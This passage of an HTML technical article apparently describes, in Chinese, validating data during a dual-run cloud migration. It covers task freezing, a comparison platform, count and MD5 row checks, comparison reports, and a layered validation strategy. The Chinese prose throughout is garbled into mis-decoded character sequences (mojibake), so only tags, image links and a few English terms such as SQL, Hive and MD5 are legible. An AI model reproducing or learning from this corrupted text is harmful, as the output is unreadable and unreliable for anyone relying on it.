<p>åŒè·‘æœŸé—´ä¸æ‰“å¼€çš„ä»»åŠ¡ï¼š</p>
<ul>
<li>ä¸€æ¬¡æ€§ä»»åŠ¡</li>
<li>æ‰€æœ‰Dorisç›¸å…³ä»»åŠ¡ï¼ŒåŒ…å«Doris SQLã€ShellDorisã€Hive2dorisç­‰ç±»å‹ä¸æ‰“å¼€</li>
<li>Hive to Anyä»»åŠ¡</li>
</ul>
</blockquote>
<p>å¯¹æ­¤ç±»ä»»åŠ¡ï¼Œåœ¨åŒè·‘å¯åŠ¨å‰ä¼šå†»ç»“ï¼Œé¿å…å¯¹ç›®æ ‡ç«¯æˆ–å¤–éƒ¨ç³»ç»Ÿé€ æˆå¹²æ‰°ã€‚åŒæ—¶ï¼Œå¯¹å…³é”®å†»ç»“ä»»åŠ¡æä¾› Mock æ•°æ®æˆ–ç©ºè·‘ç­–ç•¥ï¼Œä¿éšœä¸‹æ¸¸é“¾è·¯å®Œæ•´æ€§ã€‚</p>
<p>é€šè¿‡ä¸Šè¿°æªæ–½ï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ª<strong>é«˜ä¿çœŸã€ä½å¹²æ‰°ã€å¯å›æº¯</strong>çš„åŒè·‘ç¯å¢ƒï¼Œä¸ºåç»­å¤§è§„æ¨¡ã€è‡ªåŠ¨åŒ–æ•°æ®éªŒè¯å¥ å®šäº†åšå®åŸºç¡€ã€‚åœ¨æ•´ä¸ªåŒè·‘å‘¨æœŸï¼ˆçº¦ 2â€“3 å‘¨ï¼‰å†…ï¼Œç³»ç»Ÿå¹³ç¨³è¿è¡Œï¼Œæœªå‘ç”Ÿå› éªŒè¯å¯¼è‡´çš„ç”Ÿäº§äº‹æ•…ï¼ŒçœŸæ­£å®ç°äº†â€œ<strong>ä¸šåŠ¡è¿è¡Œæ— æ„Ÿï¼ŒéªŒè¯æœ‰ç†æœ‰æ®</strong>â€ã€‚</p>
<h3 data-id="heading-9">2. éªŒæ•°å¹³å°</h3>
<p>ä¸ºäº†ä¿éšœåŒè·‘éªŒæ•°å·¥ä½œé«˜æ•ˆæ¨è¿›ï¼Œæˆ‘ä»¬åŸºäº Kirk ç³»ç»Ÿè‡ªç ”äº†ä¸€å¥—é«˜ååã€é«˜æ€§èƒ½ã€å¯æ‰©å±•çš„è‡ªåŠ¨åŒ–éªŒæ•°å¹³å°ã€‚å¹³å°è®¾è®¡éµå¾ªä»¥ä¸‹æ ¸å¿ƒæ€è·¯ï¼š</p>
<ul>
<li><strong>å¹³å°åŒ–ä¸è‡ªåŠ¨åŒ–</strong>
å°†ç¹ççš„éªŒæ•°æ“ä½œï¼ˆå¦‚è°ƒåº¦å¯¹æ¯”ä»»åŠ¡ã€æ”¶é›†ç»“æœã€ç”ŸæˆæŠ¥å‘Šï¼‰æ•´åˆä¸ºæ ‡å‡†åŒ–ã€è‡ªåŠ¨åŒ–çš„å¹³å°æµç¨‹ï¼Œå‡å°‘äººå·¥å¹²é¢„ï¼Œæå‡æ•ˆç‡ä¸ä¸€è‡´æ€§ã€‚</li>
<li><strong>å¤šç»´åº¦å¯æ‰©å±•</strong>
æ”¯æŒå¤šç§éªŒæ•°ç­–ç•¥çš„é€‰æ‹©ï¼Œå¦‚æ¯”è®¡æ•°ã€æ¯”å…³é”®å­—æ®µå“ˆå¸Œã€æ¯”å…¨å­—æ®µç­‰ï¼Œæ”¯æŒéªŒæ”¶é˜ˆå€¼é…ç½®ï¼Œè¿˜æ”¯æŒé«˜åº¦å®šåˆ¶åŒ–çš„éªŒæ•°é€»è¾‘ï¼Œå¦‚è‡ªå®šä¹‰SQLã€‚</li>
<li><strong>é¢å‘ä¸šåŠ¡ååŒ</strong>
æä¾›æ¸…æ™°çš„éªŒæ•°æŠ¥å‘Šï¼ŒæŒ‰éƒ¨é—¨ã€è¡¨é‡è¦æ€§åˆ†ç±»ï¼Œè¾“å‡ºæ¯”å¯¹ç»“æœï¼Œå·®å¼‚ç‡ï¼Œå·®å¼‚æ˜ç»†ç­‰ï¼Œç”¨æˆ·å¯å¿«é€Ÿæ‰¾åˆ°ä¸ä¸€è‡´çš„åŸå› ï¼Œå®ç°è´£ä»»åˆ°äººï¼Œè¿‡ç¨‹é€æ˜ã€‚</li>
</ul>
<h4 data-id="heading-10">2.1 è·¨äº‘æ•°æ®éªŒè¯</h4>
<p>é“¾è·¯åŒè·‘å®Œæˆä¹‹åï¼Œå¾…éªŒè¯æ•°æ®åˆ†åˆ«åœ¨ä¸¤æœµäº‘ï¼Œä¸ºäº†é¿å…é¢‘ç¹é‡å¤çš„è·¨äº‘ä¼ è¾“ï¼Œæˆ‘ä»¬è®¾è®¡äº†æ•°æ®é›†ä¸­éªŒè¯ç­–ç•¥â€”â€”å°†æºç«¯æ•°æ®é¢„å…ˆè¿ç§»åˆ°ç›®æ ‡ç«¯ï¼Œåœ¨å•ä¸€äº‘ç¯å¢ƒå†…å®Œæˆå…¨éƒ¨éªŒè¯å·¥ä½œã€‚</p>
<h5 data-id="heading-11">2.1.1 æ•°æ®å‡†å¤‡</h5>
<p>è¦æŠŠæ•°æ®è¿ç§»åˆ°åŒä¸€æœµäº‘ä¸Šï¼Œé¦–å…ˆè¦è§£å†³çš„ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ•°æ®æ”¾å“ªé‡Œæ€ä¹ˆæ”¾çš„é—®é¢˜ï¼Œæ— è®ºéªŒæ•°ç»“æœæ˜¯å¦é€šè¿‡ï¼Œæœ€ç»ˆéƒ½ä¼šä»¥æºç«¯æ•°æ®ä¸ºåŸºå‡†å»è¦†ç›–ç›®æ ‡ç«¯çš„æ•°æ®ï¼Œå› æ­¤åœ¨éªŒæ•°çš„å‡†å¤‡è¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ­¥å…ˆå°†ç›®æ ‡ç«¯å¾…éªŒè¯çš„æ•°æ®ç§»åŠ¨åˆ°æ¯”å¯¹åº“ä¸­é¿å…è¢«æºç«¯è¦†ç›–ï¼ˆrenameæ“ä½œï¼Œä¸ä¼šäº§ç”Ÿæ•°æ®è¯»å†™ï¼‰ï¼Œç¬¬äºŒæ­¥ä½¿ç”¨Kirkï¼ˆè‡ªç ”æ•°æ®è¿ç§»å·¥å…·ï¼‰æŠŠæºç«¯æ•°æ®æ¬è¿åˆ°ç›®æ ‡ç«¯æ­£å¼ç›®å½•ä¸Šï¼Œé€šè¿‡è¿™ä¸¤ä¸ªæ­¥éª¤ï¼Œæ—¢å®Œæˆäº†æ•°æ®è¿ç§»ä»»åŠ¡ï¼Œåˆä¸ºäº‘å†…æ¯”å¯¹åšå¥½äº†æ•°æ®å‡†å¤‡ã€‚
è¿™ä¸ªè¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„éåˆ†åŒºè¡¨çš„ç‰¹æ®Šå¤„ç†ï¼Œé€šå¸¸éåˆ†åŒºè¡¨çš„å¤§å°éƒ½æ¯”è¾ƒå°ï¼ˆä¸»è¦æ˜¯ç»´è¡¨ï¼‰ï¼Œç”±äºéåˆ†åŒºè¡¨æ¯å¤©éƒ½ä¼šè‡ªè¡Œè¦†ç›–ï¼Œä¸ºäº†å®ç°å†å²çŠ¶æ€çš„å›æº¯ï¼Œéœ€è¦ä¸“é—¨é’ˆå¯¹äºéåˆ†åŒºè¡¨ä¿ç•™å†å²çŠ¶æ€çš„å¿«ç…§ï¼Œæ•°æ®å‡†å¤‡è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1edf58ecb71e482c88e2fa1caa0bb3b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=zuf8MijNLaGRfLBUZ4dKh%2BtKQ%2FQ%3D" alt="4.png" loading="lazy"/></p>
<h5 data-id="heading-12">2.1.2 æ¯”å¯¹æ–¹æ¡ˆ</h5>




















<table><thead><tr><th align="left">ç±»å‹</th><th align="left">æ–¹æ³•</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">ç²—éªŒ</td><td align="left">å¯¹æ¯”æºç«¯ä¸è…¾è®¯äº‘ä¸¤æ¡é“¾è·¯äº§å‡ºçš„è¡¨è¡Œæ•°ï¼ˆCOUNTï¼‰</td><td align="left">å¿«é€Ÿåˆ¤æ–­æ•°æ®å®Œæ•´æ€§ï¼Œæ˜¯ç²¾éªŒçš„å‰ææ¡ä»¶</td></tr><tr><td align="left">ç²¾éªŒ</td><td align="left">å¯¹æ¯å¼ è¡¨çš„æ¯è¡Œæ•°æ®è®¡ç®— MD5 å€¼ï¼Œé€è¡Œæ¯”å¯¹ä¸€è‡´æ€§</td><td align="left">ç¡®ä¿å†…å®¹çº§ 100% ä¸€è‡´ï¼Œç”¨äºæ ¸å¿ƒè¡¨éªŒè¯</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/639accd26d4645e4b82ed54c323db058~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=u%2FhapAtJSDfSzgPIt7VGQntTM4A%3D" alt="5.png" loading="lazy"/></p>
<h4 data-id="heading-13">2.2 éªŒæ•°å¹³å°ä»‹ç»</h4>
<h5 data-id="heading-14">2.2.1 åˆ›å»ºæ¯”å¯¹ä»»åŠ¡</h5>
<p>æ”¯æŒå•ä¸ª/æ‰¹é‡åˆ›å»ºæ•°æ®æ¯”å¯¹ä»»åŠ¡</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5828069a6ad4176a80abf4d4dc98237~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=HmdUmS9UmLChHZ8XUa%2FlhJoQKHI%3D" alt="6.png" loading="lazy"/></p>
<h5 data-id="heading-15">2.2.2 é…ç½®æ¯”å¯¹é€»è¾‘</h5>
<ol>
<li>countéªŒæ•°ï¼šå¯¹æ¯”åä¸ºäº‘å’Œè…¾è®¯äº‘è¡¨countè¡Œæ•°</li>
<li>è‡ªå®šä¹‰SQLéªŒæ•°ï¼šcountï¼Œsumï¼ŒæŒ‰ç»´åº¦èšåˆ</li>
<li>æ˜ç»†æ¯”å¯¹ï¼šå¯¹æ¯”æ•´è¡Œæ•°æ®çš„å·®å¼‚ï¼Œå¯ä»¥æŒ‡å®šä¸»é”®å’Œæ’é™¤å­—æ®µ</li>
<li>æ•°å€¼å·®å¼‚æ¯”å¯¹ï¼šå°†æ•°å€¼å­—æ®µæŒ‰ç…§ +-*/ ç­‰è§„åˆ™è®¡ç®—å·®å¼‚ç‡ï¼Œå¹¶å¯å•ç‹¬æŒ‡å®šæ¯ä¸ªå­—æ®µçš„å·®å¼‚ç‡é˜ˆå€¼</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78388d70b10143d29592dd1a916a23fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=i8hbXSV9eSd7Z0ZY5tTaUwuZ2AA%3D" alt="7.png" loading="lazy"/></p>
<h5 data-id="heading-16">2.2.3 è¿è¡Œæ¯”å¯¹ä»»åŠ¡</h5>
<p>ç”¨æˆ·å¯ä»¥æ ¹æ®éœ€æ±‚ï¼Œé€‰æ‹©è‡ªåŠ¨æ‰§è¡Œæˆ–è€…å®šæ—¶æ‰§è¡Œæ¯”å¯¹é€»è¾‘ï¼ŒåŠŸèƒ½ä»‹ç»å¦‚ä¸‹ï¼š</p>

































<table><thead><tr><th align="left">å¯¹æ¯”é¡¹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">æ˜¯å¦countæ¯”å¯¹</td><td align="left">æ‰§è¡Œè¡Œæ•°ä¸€è‡´æ€§æ ¡éªŒ</td></tr><tr><td align="left">æ˜¯å¦è‡ªå®šä¹‰SQLæ¯”å¯¹</td><td align="left">æ‰§è¡Œç”¨æˆ·è‡ªå®šä¹‰SQLæ ¡éªŒ</td></tr><tr><td align="left">æ˜¯å¦æ˜ç»†æ¯”å¯¹</td><td align="left">æ‰§è¡Œå­—æ®µçº§ä¸€è‡´æ€§éªŒè¯</td></tr><tr><td align="left">æ˜¯å¦æ•°å€¼å·®å¼‚æ¯”å¯¹</td><td align="left">æ‰§è¡Œæ•°å€¼å­—æ®µå››åˆ™è¿ç®—ä¸€è‡´æ€§éªŒè¯</td></tr><tr><td align="left">æ˜¯å¦BIæ•°å€¼å·®å¼‚æ¯”å¯¹</td><td align="left">æ‰§è¡Œæ•°å€¼æ³¢åŠ¨ç‡ä¸€è‡´æ€§éªŒè¯</td></tr><tr><td align="left">BIæ˜¯å¦å¤¸å¤©æ¯”å¯¹</td><td align="left">æ‰§è¡Œæ•°å€¼æ³¢åŠ¨ç‡ä¸€è‡´æ€§éªŒè¯å¹¶ä¸”å¯è‡ªå®šä¹‰åŒç¯æ¯”æ—¥æœŸ</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99062fd4c5fc45bd8c32c7bb5ae400b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=pJcwQGy752uaQo7AOZagO%2B%2FQtU4%3D" alt="8.png" loading="lazy"/></p>
<h5 data-id="heading-17">2.2.4 ä¸‹è½½æ¯”å¯¹æŠ¥å‘Š</h5>





































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>å…¨å±€æ¯”å¯¹ç»“æœ</td><td>è¯¥ task æœ€ç»ˆçš„æ¯”å¯¹çŠ¶æ€ï¼Œåˆ†ä¸ºï¼šæœªçŸ¥ï¼ˆç³»ç»Ÿæ¯”å¯¹ SQL å’Œç”¨æˆ·è‡ªå®šä¹‰ SQL è¿è¡Œå¼‚å¸¸ï¼‰ï¼Œä¸€è‡´ï¼ˆç³»ç»Ÿæ¯”å¯¹ SQL å’Œç”¨æˆ·è‡ªå®šä¹‰ SQL éƒ½ä¸€è‡´ï¼‰ï¼Œä¸ä¸€è‡´ï¼ˆç³»ç»Ÿæ¯”å¯¹ SQL æˆ–ç”¨æˆ·è‡ªå®šä¹‰ SQL ä¸ä¸€è‡´ï¼‰</td></tr><tr><td>ç³»ç»Ÿæ¯”å¯¹ç»“æœ</td><td>ç³»ç»Ÿç”Ÿæˆçš„ Count SQL æ¯”å¯¹ç»“æœæ˜¯å¦ä¸€è‡´</td></tr><tr><td>ç”¨æˆ·SQLæ¯”å¯¹ç»“æœ</td><td>ç”¨æˆ·è‡ªå®šä¹‰çš„ SQL æ‰§è¡Œçš„ç»“æœæ˜¯å¦ä¸€è‡´</td></tr><tr><td>æºé“¾è·¯count</td><td>ä¸»é“¾è·¯æ‰§è¡Œ SQL Count ç»“æœ</td></tr><tr><td>è…¾è®¯äº‘count</td><td>è…¾è®¯äº‘æ‰§è¡Œ SQL Count ç»“æœ</td></tr><tr><td>countå·®å¼‚ç‡</td><td>ä¸»é“¾è·¯å’Œè…¾è®¯äº‘ Count å·®å¼‚ï¼ˆï¼ˆè…¾è®¯äº‘ Count - ä¸»é“¾è·¯ Countï¼‰/ ä¸»é“¾è·¯ Countï¼‰</td></tr><tr><td>ç³»ç»Ÿå¼‚å¸¸ä¿¡æ¯</td><td>ç³»ç»Ÿçš„å¼‚å¸¸æ—¥å¿—ï¼Œæœ‰åˆ™ç‚¹å‡»å¹¶æ˜¾ç¤º</td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6e9ea1147cb4ddf816a8e9e308fe0d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=XOaILIoVvKTWOY%2B3q9wl8Ojt%2BrQ%3D" alt="9.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5eaedc82a0ce486e918421b3656ee0ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=LOI3XN%2BKR8xYlzPQJzRKVfiUgBk%3D" alt="10.png" loading="lazy"/></p>
<h3 data-id="heading-18">3. æ•°æ®éªŒè¯ç­–ç•¥ä¸å®æ–½</h3>
<p>é¢å¯¹æ¨ªè·¨è¿‘20ä¸ªéƒ¨é—¨ã€æ¶µç›–æ•°ä¸‡å¼ Hiveè¡¨çš„åºå¤§æ•°æ®ä½“ç³»ï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€å¥—è´¯ç©¿åŒè·‘å‘¨æœŸçš„ç³»ç»Ÿæ€§éªŒæ•°æ–¹æ¡ˆã€‚è¯¥æ–¹æ¡ˆä»¥â€œå¹³å°åŒ–å·¥å…·è‡ªåŠ¨å·¡æ£€â€ä¸â€œä¸“å®¶å›¢é˜Ÿç²¾å‡†æ ¸éªŒâ€åŒè½¨å¹¶è¿›ï¼Œé€šè¿‡å±‚æ¬¡åŒ–ã€åœºæ™¯åŒ–çš„éªŒè¯æµç¨‹ï¼Œä¸ºæ ¸å¿ƒæ•°æ®çš„ä¸€è‡´æ€§ä¿é©¾æŠ¤èˆªï¼Œä¸ºä¸šåŠ¡åˆ‡æ¢ç­‘ç‰¢ä¿¡ä»»æ ¹åŸºã€‚</p>
<h4 data-id="heading-19">3.1 æ ¸å¿ƒç­–ç•¥</h4>
<h5 data-id="heading-20">3.1.1 åˆ†å±‚ã€åˆ†çº§ã€åˆ†é˜¶æ®µ</h5>
<p>ä¸ºåº”å¯¹æ•°æ®è§„æ¨¡ä¸å¤æ‚æ€§çš„æŒ‘æˆ˜ï¼Œæˆ‘ä»¬æ‘’å¼ƒäº†å•ä¸€ç»´åº¦çš„éªŒè¯æ–¹å¼ï¼Œç¡®ç«‹äº†ä»¥ä¸‹æ ¸å¿ƒç­–ç•¥
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f031f6fe4b8481283c165590aec84e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=gT2ckkNPaxoi%2FKE%2Ba6nzygvyAHM%3D" alt="11.png" loading="lazy"/></p>
<ul>
<li><strong>åˆ†å±‚éªŒè¯</strong>ï¼ˆä»æ•°æ®äº§ç”Ÿçš„æŠ€æœ¯æµç¨‹å’Œä¾èµ–å…³ç³»å…¥æ‰‹ï¼‰ä»åŸºç¡€æ•°æ®å±‚ï¼ˆODS/DWDï¼‰åˆ°åº”ç”¨æ•°æ®å±‚ï¼ˆDWS/DM/æŠ¥è¡¨ï¼‰ä¾æ¬¡éªŒè¯ï¼Œç¡®ä¿éªŒè¯æµç¨‹ç¬¦åˆæ•°æ®åŠ å·¥é€»è¾‘ï¼Œç³»ç»Ÿæ€§é˜»æ–­åº•å±‚é”™è¯¯å‘ä¸Šè”“å»¶ã€‚</li>
<li><strong>åˆ†çº§éªŒè¯</strong>ï¼ˆä»æ•°æ®çš„é‡è¦æ€§å’Œå½±å“é¢å…¥æ‰‹ï¼‰ï¼Œå¯¹æ•°æ®è¡¨è¿›è¡ŒP0ï¼ˆæ ¸å¿ƒï¼‰/P1ï¼ˆé‡è¦ï¼‰/P2ï¼ˆä¸€èˆ¬ï¼‰åˆ†çº§ï¼Œå®æ–½å·®å¼‚åŒ–çš„éªŒè¯å¼ºåº¦ï¼Œç¡®ä¿èµ„æºç²¾å‡†æŠ•æ”¾ã€‚</li>
<li><strong>åˆ†é˜¶æ®µéªŒè¯</strong>ï¼ˆä»éªŒè¯å·¥ä½œçš„å®æ–½æ­¥éª¤å’Œç²¾ç»†åº¦å…¥æ‰‹ï¼‰é‡‡ç”¨â€œå…ˆç²—åç²¾â€çš„ä¸¤é˜¶æ®µæµç¨‹ï¼Œå…ˆè¡Œæ•°å¿«é€Ÿç­›æŸ¥ï¼Œå†å†…å®¹æ·±åº¦æ¯”å¯¹ï¼Œæ„å»ºé«˜æ•ˆçš„éªŒè¯æµæ°´çº¿ã€‚</li>
</ul>
<h4 data-id="heading-21">3.2 æ–¹æ¡ˆå®æ–½</h4>
<p>ä¸ºç¡®ä¿éªŒè¯çš„å…¨é¢æ€§ä¸æ·±åº¦ï¼Œæˆ‘ä»¬é‡‡ç”¨äº†<strong>å¹³å°åŒ–å·¥å…·</strong>ä¸<strong>ä¸“å®¶ç²¾å‡†æ ¸éªŒ</strong>çš„åŒè½¨åˆ¶ç­–ç•¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24e140d3f74c4a7a8cf2df51aa97dfb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=jO72HK47qexTXllgo%2FmxJ95cZaA%3D" alt="12.png" loading="lazy"/></p>
<h5 data-id="heading-22">3.2.1 å¹³å°éªŒæ•°</h5>
<p>ä¸ºæå‡éªŒè¯æ•ˆç‡ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†å…ƒåˆå¹³å°çš„éªŒæ•°å·¥å…·ï¼Œè¦†ç›–åŸºç¡€åœºæ™¯ï¼Œå®ç°è§„æ¨¡åŒ–æ•ˆç‡</p>
<ul>
<li><strong>CountéªŒæ•°</strong>ï¼šå¿«é€Ÿæ¯”å¯¹æºç«¯å’Œè…¾è®¯äº‘è¡¨æˆ–åˆ†åŒºçš„è¡Œæ•°ï¼Œæ˜¯â€œåˆ†é˜¶æ®µâ€ç­–ç•¥ä¸­â€œç²—éªŒâ€çš„æ ¸å¿ƒæ‰‹æ®µï¼Œèƒ½å¿«é€Ÿå®šä½å®è§‚å·®å¼‚ã€‚</li>
<li><strong>è‡ªå®šä¹‰SQLéªŒæ•°</strong>ï¼š
<ul>
<li><strong>æ•°æ®æµå®Œæ•´æ€§éªŒè¯</strong>ï¼šéªŒè¯ä»ODSæºå¤´åˆ°DMåº”ç”¨å±‚çš„æ•°æ®åŠ å·¥é“¾æ˜¯å¦å‡†ç¡®ã€‚ä¾‹å¦‚ï¼Œç¼–å†™SQLæ£€æŸ¥DMå±‚çš„â€œç”¨æˆ·æ€»æ¶ˆè´¹é‡‘é¢â€æ˜¯å¦ç­‰äºå¯¹DWDå±‚æ‰€æœ‰ç›¸å…³æ˜ç»†è®¢å•é‡‘é¢çš„æ±‡æ€»ã€‚</li>
<li><strong>å…³é”®KPIæ¯”å¯¹</strong>ï¼šå¦‚â€œå½“æ—¥GTVâ€ã€â€œæ´»è·ƒç”¨æˆ·æ•°â€ã€â€œå¹³å‡å“åº”æ—¶é•¿â€ç­‰ã€‚éœ€è¦ç¼–å†™æ‰¿è½½äº†å®Œæ•´ã€ä¸€è‡´ä¸šåŠ¡å£å¾„çš„SQLï¼ˆæ¶‰åŠå¤šè¡¨å…³è”ã€å»é‡ã€è¿‡æ»¤ã€èšåˆï¼‰</li>
</ul>
</li>
<li><strong>æ˜ç»†æ¯”å¯¹</strong>ï¼šåŸºäºä¸»é”®æˆ–å”¯ä¸€é”®çš„é€è¡Œå­—æ®µçº§ç²¾å‡†æ¯”å¯¹ï¼Œæ˜¯â€œç²¾éªŒâ€é˜¶æ®µéªŒè¯æ•°æ®æ˜ç»†ä¸€è‡´æ€§çš„å…³é”®æ‰‹æ®µã€‚</li>
<li><strong>æ•°å€¼å·®å¼‚æ¯”å¯¹</strong>ï¼šé’ˆå¯¹æ•°å€¼å‹å­—æ®µï¼Œè®¾ç½®è¯¯å·®å®¹å¿åŒºé—´ï¼Œç§‘å­¦åœ°åˆ¤å®šåœ¨åˆç†æ³¢åŠ¨èŒƒå›´å†…çš„æ•°æ®ä¸€è‡´æ€§ï¼Œæœ‰æ•ˆè§£å†³äº†æŠ¥è¡¨å±‚å› å¾®å°æ—¶é—´å·®å¯¼è‡´åŒ¹é…ä¸ä¸Šçš„ç»å…¸éš¾é¢˜ã€‚</li>
</ul>
<h5 data-id="heading-23">3.2.2 ä¸“å®¶éªŒæ•°ï¼šæ”»åšå¤æ‚åœºæ™¯ï¼Œç¡®ä¿ä¸šåŠ¡æ·±åº¦å¯ä¿¡</h5>
<p>å¯¹äºå…ƒåˆéªŒæ•°å¹³å°æ— æ³•è¦†ç›–çš„å¤æ‚ã€å®šåˆ¶åŒ–åœºæ™¯ï¼Œæˆ‘ä»¬ä¾èµ–æ•°æ®å¼€å‘è€…çš„é¢†åŸŸçŸ¥è¯†ä¸ç»éªŒè¿›è¡Œæ·±åº¦éªŒè¯ã€‚</p>
<ul>
<li><strong>éªŒè¯èŒƒå›´</strong>ï¼šèšç„¦äºæ ¸å¿ƒé“¾è·¯è¡¨ä¸å„éƒ¨é—¨è®¤å®šçš„é‡è¦è¡¨ã€‚
<ul>
<li>ç»ˆç«¯è¡¨ä¼˜å…ˆéªŒè¯ï¼šä¼˜å…ˆéªŒè¯ç›´æ¥é¢å‘ä¸šåŠ¡åº”ç”¨çš„ç»ˆç«¯äº§å‡ºè¡¨ã€‚è‹¥ç»ˆç«¯è¡¨æ•°æ®å‡†ç¡®ï¼Œåˆ™å…¶ä¸Šæ¸¸æ•°æ®å¤„ç†é“¾è·¯åœ¨å¤§æ¦‚ç‡ä¸Šæ˜¯æ­£ç¡®çš„ï¼Œè¿™æ˜¯ä¸€ç§é«˜æ•ˆçš„é€†å‘éªŒè¯æ€è·¯ã€‚</li>
<li>å…³é”®èŠ‚ç‚¹è¡¨éªŒè¯ï¼šå¯¹æ‰¿ä¸Šå¯ä¸‹çš„å…³é”®å®½è¡¨ã€é‡åº¦èšåˆè¡¨ç­‰è¿›è¡Œé‡ç‚¹æ ¸æŸ¥ï¼Œç¡®ä¿æ ¸å¿ƒæ•°æ®åŠ å·¥èŠ‚ç‚¹çš„å‡†ç¡®æ€§ã€‚</li>
</ul>
</li>
<li><strong>éªŒè¯æ–¹æ³•</strong>ï¼š
<ol>
<li>é¢†åŸŸä¸“ä¸šéªŒè¯ï¼šç»“åˆä¸šåŠ¡è¯­ä¹‰ï¼Œå¯¹é‡è¦ç»´åº¦ï¼ˆå¦‚åœ°åŒºã€æ¸ é“ï¼‰ã€å…³é”®æŒ‡æ ‡ï¼ˆå¦‚GMVã€è½¬åŒ–ç‡ï¼‰è¿›è¡Œèšåˆç»Ÿè®¡ä¸è¶‹åŠ¿æ¯”å¯¹ï¼Œä»ä¸šåŠ¡è§†è§’åˆ¤æ–­æ•°æ®åˆç†æ€§ã€‚</li>
<li>æ ‡å‡†é€è¡Œæ¯”è¾ƒéªŒè¯ï¼šå¯¹äºè¦æ±‚ç»å¯¹ä¸€è‡´çš„æ ¸å¿ƒè¡¨ï¼Œåˆ©ç”¨æˆ‘ä»¬æä¾›çš„æ·±åº¦éªŒæ•°å·¥å…·ï¼ˆæ”¯æŒåœ¨è…¾è®¯äº‘ä¾§è¿›è¡Œæ•°æ®æ¯”å¯¹ï¼‰ï¼Œå¯å¯¹æ¯ä¸€è¡Œæ•°æ®çš„æ‰€æœ‰å­—æ®µæˆ–éƒ¨åˆ†å…³é”®å­—æ®µè®¡ç®—MD5å€¼ï¼Œè¿›è¡Œæ— æŸçš„ç²¾ç¡®æ¯”å¯¹ï¼Œç¡®ä¿æ•°æ®100%ä¸€è‡´ã€‚</li>
</ol>
</li>
</ul>
<h5 data-id="heading-24">3.2.3 æ ‡å‡†åŒ–è¿è¥æµç¨‹</h5>
<p>æˆ‘ä»¬å»ºç«‹äº†ä¸“èŒçš„éªŒæ•°å°ç»„ï¼Œé©±åŠ¨éªŒè¯å·¥ä½œé—­ç¯ï¼š
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/805cd0e707b04695a846d27e30481331~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767593934&amp;x-signature=RVUYOADZUHgGOrqGEjOJQLMTNeE%3D" alt="13.png" loading="lazy"/></p>
<ul>
<li>é¡ºåºæ¨è¿›ï¼šä¸¥æ ¼æ‰§è¡Œâ€œå…ˆåŸºç¡€å±‚ï¼Œååº”ç”¨å±‚â€çš„éªŒè¯é¡ºåºã€‚</li>
</ul>
